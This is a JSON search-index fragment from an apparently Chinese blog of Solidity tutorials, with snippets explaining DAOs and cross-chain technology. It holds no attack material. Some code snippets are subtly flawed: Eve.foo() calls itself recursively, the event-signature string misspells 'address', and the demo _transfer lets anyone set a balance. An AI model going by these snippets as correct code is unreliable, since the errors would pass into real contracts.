(DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"4 去中心化自治组织应用 慈善机构 – 可以接受全世界任何人的捐赠，并投票决定要资助的项目。 集体所有权 – 可以购买实体或数字资产，组织成员可以投票决定如何使用它们。 风险投资和赠款 - 您可以成立一个风险基金，汇集投资资本并投票进行商业投资。 后续收益可以分配给相应 DAO 成员。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:4:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"5 去中心化自治组织如何运作？ 智能合约是去中心化自治组织的基础，它定义了组织的规则并持有组织的资产。 合约在以太坊上生效后，除非表决通过，否则任何人都不能修改规则。 任何人都无法超越合约定义的规则和逻辑行事。 由于资产也由智能合约定义，这也意味着未经组织批准任何人都不能使用资金。 所以去中心化组织也不需要中央权威。 相反，组织集体作出决定，而付款会在表决通过后自动获批。 之所以能够做到这一点，是因为智能合约在以太坊上生效后，就无法被篡改。 一切都是公开的，你不可能在其他人一无所知的情况下修改代码（去中心化组织定义的规则）。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:5:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"6 去中心化自治组织的治理 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:6:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"6.1 委托 委托就像是去中心化自治组织的代议制民主。 代币持有者将投票委托给那些自提名并承诺管理协议和随时了解动态的用户。 案例：以太坊域名服务（ENS）- 以太坊域名服务持有者可以将他们的选票委托给参与的社区成员来代表他们。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:6:1","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"6.2 自动交易治理 在很多去中心化自治组织中，如果达到法定人数的成员投票赞成，交易将自动执行。 案例：Nouns — 在 Nouns 去中心化自治组织中，只要创始人不否决，如果投票达到法定票数并且多数票赞成，那么交易将自动执行。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:6:2","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"6.1 多重签名治理 虽然去中心化自治组织可能有数千名有投票权的成员，但资金一般会放在一个由 5 到 20 名活跃社区成员共同管理的钱包中，这些成员受组织信任并接受监督（社区知道他们的公开身份）。 投票后，执行多重签名的签名者将执行社区的意志。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:6:3","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"7 去中心化自治组织的成员资格 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:7:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"7.1 基于代币的成员资格 通常无需许可，取决于其使用的代币。 通常，这些治理代币在去中心化交易所无需许可即可易， 其余代币要通过提供流动性或“工作量证明”才能赚取。 无论何种方式，只要持有代币就可以参与投票。 案例：MakerDAO — 去中心化交易所普遍提供 MakerDAO 的代币 MKR，任何人都可以买入，从而获得对 Maker 协议未来的投票权。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:7:1","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"7.2 基于份额的成员资格 基于份额的去中心化自治组织通常拥有更多权限，但仍然相当公开透明。 任何潜在成员都可以提交加入去中心化自治组织的提案，并且通常以代币或工作的形式提供有价值的贡献。 份额代表直接投票权和所有权。 成员可以随时退出组织并带走属于他们的资金份额。 通常用于联系更紧密、以人为中心的组织，例如慈善机构、工人团体和投资俱乐部等。 也可以管理协议和代币。 案例：MolochDAO – MolochDAO 致力于为以太坊项目募集资金。 他们需要成员资格提案，以便组织可以评估您是否具有必要的专业知识和资本来对潜在受资助者做出明智判断。 您无法通过在公开市场上购买代币来加入这类去中心化自治组织。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:7:2","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"7.3 基于信誉的成员资格 信誉代表参加投票的证明，并授予去中心化自治组织中的投票权。 不同于基于代币或份额的成员资格，基于信誉的去中心化自治组织不会将所有权转让给贡献者。 信誉积分不能够购买、转让或委托；去中心化自治组织成员必须通过参与获得信誉积分。 链上投票无需许可，潜在成员可以自由提交加入去中心化自治组织的提案，并要求获得信誉积分和代币，作为他们所做贡献的奖励。 通常用于协议和去中心化应用程序的去中心化开发和管理，但同时非常适合各类组织，例如慈善机构、工人团体、投资俱乐部等。 案例：DXdao – DXdao 是一个全球性的主权团体，自 2019 年以来一直致力于构建和管理去中心化协议和应用。 该组织利用基于信誉积分的治理和全息共识来协调和管理资金，这意味着任何人都不能对它的未来施加影响。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:7:3","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识","Solidity 基础"],"content":"抽象合约 如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体{}中的内容，则必须将该合约标为abstract，不然编译会报错；另外，未实现的函数需要加virtual，以便子合约重写。 abstract contract InsertionSort{ function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory); } ","date":"2021-05-09","objectID":"/posts/solidity-abstract-interface.html:1:0","tags":["solidity","basic"],"title":"抽象合约（abstract）和接口（interface）","uri":"/posts/solidity-abstract-interface.html"},{"categories":["基础知识","Solidity 基础"],"content":"接口 接口类似于抽象合约，但它不实现任何功能。接口的规则： 不能包含状态变量 不能包含构造函数 不能继承除接口外的其他合约 所有函数都必须是external且不能有函数体 继承接口的合约必须实现接口定义的所有功能 虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如ERC20或ERC721），其他Dapps和智能合约就知道如何与它交互。因为接口提供了两个重要的信息： 合约里每个函数的bytes4选择器，以及函数签名函数名(每个参数类型）。 接口id（更多信息见EIP165） 另外，接口与合约ABI（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的ABI，利用abi-to-sol工具也可以将ABI json文件转换为接口sol文件。 我们以ERC721接口合约IERC721为例，它定义了3个event和9个function，所有ERC721标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。 interface IERC721 is IERC165 { event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function getApproved(uint256 tokenId) external view returns (address operator); function setApprovalForAll(address operator, bool _approved) external; function isApprovedForAll(address owner, address operator) external view returns (bool); function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external; } ","date":"2021-05-09","objectID":"/posts/solidity-abstract-interface.html:2:0","tags":["solidity","basic"],"title":"抽象合约（abstract）和接口（interface）","uri":"/posts/solidity-abstract-interface.html"},{"categories":["基础知识","Solidity 基础"],"content":"IERC721事件 IERC721包含3个事件，其中Transfer和Approval事件在ERC20中也有。 Transfer事件：在转账时被释放，记录代币的发出地址from，接收地址to和tokenid。 Approval事件：在授权时释放，记录授权地址owner，被授权地址approved和tokenid。 ApprovalForAll事件：在批量授权时释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。 ","date":"2021-05-09","objectID":"/posts/solidity-abstract-interface.html:2:1","tags":["solidity","basic"],"title":"抽象合约（abstract）和接口（interface）","uri":"/posts/solidity-abstract-interface.html"},{"categories":["基础知识","Solidity 基础"],"content":"IERC721函数 balanceOf：返回某地址的NFT持有量balance。 ownerOf：返回某tokenId的主人owner。 transferFrom：普通转账，参数为转出地址from，接收地址to和tokenId。 safeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。 approve：授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。 getApproved：查询tokenId被批准给了哪个地址。 setApprovalForAll：将自己持有的该系列NFT批量授权给某个地址operator。 isApprovedForAll：查询某地址的NFT是否批量授权给了另一个operator地址。 safeTransferFrom：安全转账的重载函数，参数里面包含了data。 ","date":"2021-05-09","objectID":"/posts/solidity-abstract-interface.html:2:2","tags":["solidity","basic"],"title":"抽象合约（abstract）和接口（interface）","uri":"/posts/solidity-abstract-interface.html"},{"categories":["基础知识","Solidity 基础"],"content":"什么时候使用接口？ 如果我们知道一个合约实现了IERC721接口，我们不需要知道它具体代码实现，就可以与它交互。 无聊猿BAYC属于ERC721代币，实现了IERC721接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用IERC721接口就可以与它交互，比如用balanceOf()来查询某个地址的BAYC余额，用safeTransferFrom()来转账BAYC。 contract interactBAYC { // 利用BAYC地址创建接口合约变量（ETH主网） IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D); // 通过接口调用BAYC的balanceOf()查询持仓量 function balanceOfBAYC(address owner) external view returns (uint256 balance){ return BAYC.balanceOf(owner); } // 通过接口调用BAYC的safeTransferFrom()安全转账 function safeTransferFromBAYC(address from, address to, uint256 tokenId) external{ BAYC.safeTransferFrom(from, to, tokenId); } } ","date":"2021-05-09","objectID":"/posts/solidity-abstract-interface.html:2:3","tags":["solidity","basic"],"title":"抽象合约（abstract）和接口（interface）","uri":"/posts/solidity-abstract-interface.html"},{"categories":["基础知识","Solidity 基础"],"content":"继承 继承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话，solidity也是面向对象的编程，也支持继承。 ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:0","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"规则 virtual: 父合约中的函数，如果希望子合约重写，需要加上virtual关键字。 override：子合约重写了父合约中的函数，需要加上override关键字。 注意：用override修饰public变量，会重写与变量同名的getter函数，例如： mapping(address =\u003e uint256) public override balanceOf; ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:1","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"简单继承 我们先写一个简单的爷爷合约Yeye，里面包含1个Log事件和3个function: hip(), pop(), yeye()，输出都是”Yeye”。 contract Yeye { event Log(string msg); // 定义3个function: hip(), pop(), man()，Log值为Yeye。 function hip() public virtual{ emit Log(\"Yeye\"); } function pop() public virtual{ emit Log(\"Yeye\"); } function yeye() public virtual { emit Log(\"Yeye\"); } } 我们再定义一个爸爸合约Baba，让他继承Yeye合约，语法就是contract Baba is Yeye，非常直观。在Baba合约里，我们重写一下hip()和pop()这两个函数，加上override关键字，并将他们的输出改为”Baba”；并且加一个新的函数baba，输出也是”Baba”。 contract Baba is Yeye{ // 继承两个function: hip()和pop()，输出改为Baba。 function hip() public virtual override{ emit Log(\"Baba\"); } function pop() public virtual override{ emit Log(\"Baba\"); } function baba() public virtual{ emit Log(\"Baba\"); } } 我们部署合约，可以看到Baba合约里有4个函数，其中hip()和pop()的输出被成功改写成”Baba”，而继承来的yeye()的输出仍然是”Yeye”。 ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:2","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"多重继承 solidity的合约可以继承多个合约。规则： 继承时要按辈分最高到最低的顺序排。比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成contract Erzi is Yeye, Baba，而不能写成contract Erzi is Baba, Yeye，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的hip()和pop()，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字，例如override(Yeye, Baba)。 例子： contract Erzi is Yeye, Baba{ // 继承两个function: hip()和pop()，输出值为Erzi。 function hip() public virtual override(Yeye, Baba){ emit Log(\"Erzi\"); } function pop() public virtual override(Yeye, Baba) { emit Log(\"Erzi\"); } 我们可以看到，Erzi合约里面重写了hip()和pop()两个函数，将输出改为”Erzi”，并且还分别从Yeye和Baba合约继承了yeye()和baba()两个函数。 ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:3","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"修饰器的继承 Solidity中的修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加virtual和override关键字即可。 contract Base1 { modifier exactDividedBy2And3(uint _a) virtual { require(_a % 2 == 0 \u0026\u0026 _a % 3 == 0); _; } } contract Identifier is Base1 { //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数 function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) { return getExactDividedBy2And3WithoutModifier(_dividend); } //计算一个数分别被2除和被3除的值 function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint){ uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); } } Identifier合约可以直接在代码中使用父合约中的exactDividedBy2And3修饰器，也可以利用override关键字重写修饰器： modifier exactDividedBy2And3(uint _a) override { _; require(_a % 2 == 0 \u0026\u0026 _a % 3 == 0); } ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:4","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"构造函数的继承 子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约A里面有一个状态变量a，并由构造函数的参数来确定： // 构造函数的继承 abstract contract A { uint public a; constructor(uint _a) { a = _a; } } 在继承时声明父构造函数的参数，例如：contract B is A(1) 在子合约的构造函数中声明构造函数的参数，例如： contract C is A { constructor(uint _c) A(_c * _c) {} } ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:5","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"调用父合约的函数 子合约有两种方式调用父合约的函数，直接调用和利用super关键字。 直接调用：子合约可以直接用父合约名.函数名()的方式来调用父合约函数，例如Yeye.pop()。 function callParent() public{ Yeye.pop(); } super关键字：子合约可以利用super.函数名()来调用最近的父合约函数。solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()： function callParentSuper() public{ // 将调用最近的父合约函数，Baba.pop() super.pop(); } ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:6","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"多重继承中的菱形继承 在面向对象编程中，钻石继承（菱形继承）指一个派生类同时有两个或两个以上的基类。 在多重+菱形继承链条上使用super关键字时，需要注意的是使用super会调用继承链条上的每一个合约的相关函数，而不是只调用最近的父合约。 我们先写一个合约God，再写Adam和Eve两个合约继承God合约，最后让创建合约people继承自Adam和Eve，每个合约都有foo和bar两个函数。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; /* 继承树： God / \\ Adam Eve \\ / people */ contract God { event Log(string message); function foo() public virtual { emit Log(\"God.foo called\"); } function bar() public virtual { emit Log(\"God.bar called\"); } } contract Adam is God { function foo() public virtual override { emit Log(\"Adam.foo called\"); } function bar() public virtual override { emit Log(\"Adam.bar called\"); super.bar(); } } contract Eve is God { function foo() public virtual override { emit Log(\"Eve.foo called\"); Eve.foo(); } function bar() public virtual override { emit Log(\"Eve.bar called\"); super.bar(); } } contract people is Adam, Eve { function foo() public override(Adam, Eve) { super.foo(); } function bar() public override(Adam, Eve) { super.bar(); } } 在这个例子中，调用合约people中的super.bar()会依次调用Eve、Adam，最后是God合约。 虽然Eve、Adam都是God的子合约，但整个过程中God合约只会被调用一次。原因是Solidity借鉴了Python的方式，强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序。更多细节你可以查阅Solidity的官方文档。 ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:1:7","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"在Remix上验证 合约简单继承示例, 可以观察到Baba合约多了Yeye的函数 合约多重继承可以参考简单继承的操作步骤来增加部署Erzi合约，然后观察暴露的函数以及尝试调用来查看日志 修饰器继承示例 构造函数继承示例 调用父合约示例 菱形继承示例 ","date":"2021-04-12","objectID":"/posts/solidity-extends.html:2:0","tags":["solidity","basic"],"title":"简单继承与复杂继承之间的学习","uri":"/posts/solidity-extends.html"},{"categories":["基础知识","Solidity 基础"],"content":"事件 Solidity中的事件（event）是EVM上日志的抽象，它具有两个特点： 响应：应用程序（ethers.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。 经济：事件是EVM上比较经济的存储数据的方式，每个大概消耗2,000 gas；相比之下，链上存储一个新变量至少需要20,000 gas。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:1:0","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"声明事件 事件的声明由event关键字开头，接着是事件名称，括号里面写好事件需要记录的变量类型和变量名。以ERC20代币合约的Transfer事件为例： event Transfer(address indexed from, address indexed to, uint256 value); 我们可以看到，Transfer事件共记录了3个变量from，to和value，分别对应代币的转账地址，接收地址和转账数量，其中from和to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:1:1","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"释放事件 我们可以在函数里释放事件。在下面的例子中，每次用_transfer()函数进行转账操作的时候，都会释放Transfer事件，并记录相应的变量。 // 定义_transfer函数，执行转账逻辑 function _transfer( address from, address to, uint256 amount ) external { _balances[from] = 10000000; // 给转账地址一些初始代币 _balances[from] -= amount; // from地址减去转账数量 _balances[to] += amount; // to地址加上转账数量 // 释放事件 emit Transfer(from, to, amount); } ","date":"2021-04-02","objectID":"/posts/solidity-event.html:1:2","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"EVM日志 Log 以太坊虚拟机（EVM）用日志Log来存储Solidity事件，每条日志记录都包含主题topics和数据data两部分。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:2:0","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"主题 Topics 日志的第一部分是主题数组，用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）。对于上面的Transfer事件，它的签名就是： keccak256(\"Transfer(addrses,address,uint256)\") //0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef 除了事件签名，主题还可以包含至多3个indexed参数，也就是Transfer事件中的from和to。 indexed标记的参数可以理解为检索事件的索引“键”，方便之后搜索。每个 indexed 参数的大小为固定的256比特，如果参数太大了（比如字符串），就会自动计算哈希存储在主题中。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:2:1","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"数据 Data 事件中不带 indexed的参数会被存储在 data 部分中，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topic 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topic 更少。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:2:2","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"Remix演示 以 Event.sol 合约为例，编译部署。 然后调用 _transfer 函数。 点击右侧的交易查看详情，可以看到日志的具体内容。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:3:0","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"在etherscan上查询事件 我们尝试用_transfer()函数在Rinkeby测试网络上转账100代币，可以在etherscan上查询到相应的tx：网址。 点击Logs按钮，就能看到事件明细： Topics里面有三个元素，[0]是这个事件的哈希，[1]和[2]是我们定义的两个indexed变量的信息，即转账的转出地址和接收地址。Data里面是剩下的不带indexed的变量，也就是转账数量。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:3:1","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":"总结 很多链上分析工具包括Nansen和Dune Analysis都是基于事件工作的。 ","date":"2021-04-02","objectID":"/posts/solidity-event.html:4:0","tags":["solidity","basic"],"title":"合约中的事件（Event）介绍","uri":"/posts/solidity-event.html"},{"categories":["基础知识","Solidity 基础"],"content":" Solidity中的变量类型 constant（常量）和immutable（不变量）。状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable。 ","date":"2021-03-23","objectID":"/posts/solidity-constant-immutable.html:0:0","tags":["solidity","basic"],"title":"合约开发中比较冷门的常量（constant/immutable）","uri":"/posts/solidity-constant-immutable.html"},{"categories":["基础知识","Solidity 基础"],"content":"constant和immutable ","date":"2021-03-23","objectID":"/posts/solidity-constant-immutable.html:1:0","tags":["solidity","basic"],"title":"合约开发中比较冷门的常量（constant/immutable）","uri":"/posts/solidity-constant-immutable.html"},{"categories":["基础知识","Solidity 基础"],"content":"constant constant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。 // constant变量必须在声明的时候初始化，之后不能改变 uint256 constant CONSTANT_NUM = 10; string constant CONSTANT_STRING = \"0xAA\"; bytes constant CONSTANT_BYTES = \"WTF\"; address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000; ","date":"2021-03-23","objectID":"/posts/solidity-constant-immutable.html:1:1","tags":["solidity","basic"],"title":"合约开发中比较冷门的常量（constant/immutable）","uri":"/posts/solidity-constant-immutable.html"},{"categories":["基础知识","Solidity 基础"],"content":"immutable immutable变量可以在声明时或构造函数中初始化，因此更加灵活。 // immutable变量可以在constructor里初始化，之后不能改变 uint256 public immutable IMMUTABLE_NUM = 9999999999; address public immutable IMMUTABLE_ADDRESS; uint256 public immutable IMMUTABLE_BLOCK; uint256 public immutable IMMUTABLE_TEST; 你可以使用全局变量例如address(this)，block.number ，或者自定义的函数给immutable变量初始化。在下面这个例子，我们利用了test()函数给IMMUTABLE_TEST初始化为9： // 利用constructor初始化immutable变量，因此可以利用 constructor(){ IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test(); } function test() public pure returns(uint256){ uint256 what = 9; return(what); } ","date":"2021-03-23","objectID":"/posts/solidity-constant-immutable.html:1:2","tags":["solidity","basic"],"title":"合约开发中比较冷门的常量（constant/immutable）","uri":"/posts/solidity-constant-immutable.html"},{"categories":["基础知识","Solidity 基础"],"content":"在remix上验证 部署好合约之后，通过remix上的getter函数，能获取到constant和immutable变量初始化好的值。 constant变量初始化之后，尝试改变它的值，会编译不通过并抛出TypeError: Cannot assign to a constant variable.的错误。 immutable变量初始化之后，尝试改变它的值，会编译不通过并抛出TypeError: Immutable state variable already initialized.的错误。 ","date":"2021-03-23","objectID":"/posts/solidity-constant-immutable.html:2:0","tags":["solidity","basic"],"title":"合约开发中比较冷门的常量（constant/immutable）","uri":"/posts/solidity-constant-immutable.html"},{"categories":["基础知识","Solidity 基础"],"content":" Solidity中的变量类型 constant（常量）和immutable（不变量）。状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable。 ","date":"2021-03-01","objectID":"/posts/solidity-constructor-and-modifier.html:0:0","tags":["solidity","basic"],"title":"构造函数（constructor）和修饰器（modifier）","uri":"/posts/solidity-constructor-and-modifier.html"},{"categories":["基础知识","Solidity 基础"],"content":"构造函数 构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的owner地址： address owner; // 定义owner变量 // 构造函数 constructor() { owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址 } 注意⚠️：构造函数在不同的solidity版本中的语法并不一致，在Solidity 0.4.22之前，构造函数不使用 constructor 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 Parents，构造函数名写成 parents），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 constructor 写法。 构造函数的旧写法代码示例： pragma solidity =0.4.21; contract Parents { // 与合约名Parents同名的函数就是构造函数 function Parents () public { } } ","date":"2021-03-01","objectID":"/posts/solidity-constructor-and-modifier.html:1:0","tags":["solidity","basic"],"title":"构造函数（constructor）和修饰器（modifier）","uri":"/posts/solidity-constructor-and-modifier.html"},{"categories":["基础知识","Solidity 基础"],"content":"修饰器 修饰器（modifier）是solidity特有的语法，类似于面向对象编程中的decorator，声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。modifier的主要使用场景是运行函数前的检查，例如地址，变量，余额等。 我们来定义一个叫做onlyOwner的modifier： // 定义modifier modifier onlyOwner { require(msg.sender == owner); // 检查调用者是否为owner地址 _; // 如果是的话，继续运行函数主体；否则报错并revert交易 } 带有onlyOwner修饰符的函数只能被owner地址调用，比如下面这个例子： function changeOwner(address _newOwner) external onlyOwner{ owner = _newOwner; // 只有owner地址运行这个函数，并改变owner } 我们定义了一个changeOwner函数，运行他可以改变合约的owner，但是由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。 ","date":"2021-03-01","objectID":"/posts/solidity-constructor-and-modifier.html:2:0","tags":["solidity","basic"],"title":"构造函数（constructor）和修饰器（modifier）","uri":"/posts/solidity-constructor-and-modifier.html"},{"categories":["基础知识","Solidity 基础"],"content":"OpenZeppelin的Ownable标准实现： OpenZeppelin是一个维护solidity标准化代码库的组织，他的Ownable标准实现如下： https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol ","date":"2021-03-01","objectID":"/posts/solidity-constructor-and-modifier.html:2:1","tags":["solidity","basic"],"title":"构造函数（constructor）和修饰器（modifier）","uri":"/posts/solidity-constructor-and-modifier.html"},{"categories":["基础知识"],"content":"1 跨链概念 跨链是通过连接相对独立的区块链系统，实现资产、数据等的跨链互操作，跨链的主要实现形式包括跨链资产互换和跨链资产转移。 ","date":"2021-02-26","objectID":"/posts/what-is-the-cross-chain-of-blockchain.html:1:0","tags":["基础知识","区块链","跨链技术"],"title":"区块链“跨链”是什么？为什么要“跨链”？","uri":"/posts/what-is-the-cross-chain-of-blockchain.html"},{"categories":["基础知识"],"content":"跨链技术 2013年之前，区块链的发展主要集中在单一区块链。2013年以来，跨链技术蓬勃发展，跨链的几种主要模式相继被提出。发展到现在，包含公证人机制、侧链/中继、哈希锁定、分布式私钥控制这四种主流的跨链技术。 实现跨链的两个关键问题分别是跨链交易的原子性和跨链交易验证。哈希锁定模式利用哈希锁和时间锁能够保证跨链交易的原子性，即只有满足一定的时间条件和哈希条件交易才能够完成，从而实现跨链资产互换。对于相互独立的两条区块链而言，为实现跨链资产转移，不得不依赖于外部第三方进行信息交互，根据第三方的工作范围可以分为公证人机制和中继模式。在公证人机制下，第三方负责数据收集和交易验证；在中继模式下，第三方仅负责数据收集，交易验证由目标链完成。 